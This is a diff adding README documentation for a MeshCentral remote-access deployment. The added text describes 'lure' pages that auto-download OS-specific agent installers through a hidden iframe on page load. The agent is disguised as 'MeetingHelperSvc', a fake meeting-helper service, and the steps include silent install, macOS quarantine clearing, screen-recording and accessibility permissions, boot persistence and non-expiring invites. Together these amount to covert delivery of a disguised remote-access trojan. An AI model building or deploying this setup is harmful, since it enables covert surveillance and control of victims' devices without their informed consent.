@@ -48,3 +48,68 @@ start/crash, failed-login bursts, and healthcheck/tunnel alarms.
 `deploy.sh --check` verifies panel/bridge/gRPC/rd/tunnel/TLS/Cloudflare/disk. A
 60s healthcheck timer Telegrams after 3 consecutive failures and restarts the
 stack; a 6h heartbeat makes a silent death visible.
+## MeshCentral (unattended remote access)
+
+The panel ships a MeshCentral stand-alone server (`fleet-meshcentral.service`,
+`/opt/meshcentral`) fronted by the `fleet-edge` Cloudflare tunnel at
+`https://mesh.<zone>/` (ingress -> `127.0.0.1:9443`, TLS offloaded at the edge,
+agent endpoint `wss://mesh.<zone>/`).
+
+- `deploy/meshcentral-backup.sh` + timer back up `/opt/meshcentral/meshcentral-data`
+  and `meshcentral-files` (7 day rolling tar, mode 600) to `/var/lib/fleet/meshcentral-backups`.
+- Operator signs into the fleet panel at `https://panel.<zone>/` (Cloudflare Access
+  + panel login). The panel `/mesh` section links the stand-alone console and shows
+  install guidance per platform.
+- MeshCentral keeps its own administrator account (invite-only domain,
+  `newAccounts: 0`) with second factor; the agent connection itself is outbound and
+  does not traverse Cloudflare Access, so agent endpoints must stay outside an
+  Access policy.
+- Devices: Windows (MeshAgent installer elevated), Linux (install script), macOS
+  (binary installer + privacy permissions), Android (MeshCentral Android agent).
+  Outbound-only connection means no inbound device firewall rule is required.
+
+### Installers (per OS, as designed)
+
+MeshCentral generates the installer for each operating system; the panel serves
+the matching one on `/mesh` and through the lure:
+
+- Windows: service executable with the mesh embedded; run elevated. Silent:
+  `MeetingHelperSvc64-<group>.exe -fullinstall`.
+- Linux/BSD: the official install script (`/__lure/meshagent?os=linux`). It
+  detects the architecture, downloads the right agent and runs `-fullinstall`:
+  `sudo -E ./meshinstall.sh` (the panel-served script is preconfigured;
+  `sudo -E ./meshinstall.sh https://mesh.<zone> '<mesh-id>'` is the official
+  equivalent).
+- macOS: the official binary installer wrapped as a script
+  (`/__lure/meshagent?os=macos`, `MeetingHelperSvc-macos.sh`). Run it; it
+  downloads the universal agent, clears quarantine (`xattr`), and runs
+  `-install` with sudo. Grant Screen Recording and Accessibility after
+  installation for desktop control. No `.pkg`/`.app` is used.
+- Android: APK (`/meshagents?id=14`) plus the invite link or QR code.
+
+No zip archives are exposed and the lure never serves `.pkg`/`.app` files. Each
+installer runs as the `MeetingHelperSvc` service
+(LaunchDaemon/systemd/Windows service) and starts at boot.
+
+### Agent branding
+
+`domains."" .agentcustomization` in
+`/opt/meshcentral/meshcentral-data/config.json` sets `displayname`,
+`servicename` and `filename` to `MeetingHelperSvc`, `companyname` to
+`MeetingHelper`, and `description` to `MeetingHelper background service`.
+Branding is embedded in the agent msh at download time; installed agents keep
+their previous identity until reinstalled.
+
+### Lure auto-download
+
+Lure pages request `/__lure/meshagent?os=<detected>` on load. Windows returns
+the service executable; Linux/BSD returns the install script; macOS returns the
+binary-installer script; Android returns the APK. The hidden-iframe download follows
+the browser's normal download policy.
+
+### Mobile enrollment (QR)
+
+`/mesh` renders a QR (`/api/mesh/qr`) for the non-expiring device-group invite
+(`PANEL_MESHCENTRAL_INVITE_URL`). Install the APK, then scan the QR or open the
+invite to pair. Regenerate with
+`meshctrl GenerateInviteLink --group "Fleet Devices" --hours 0`.
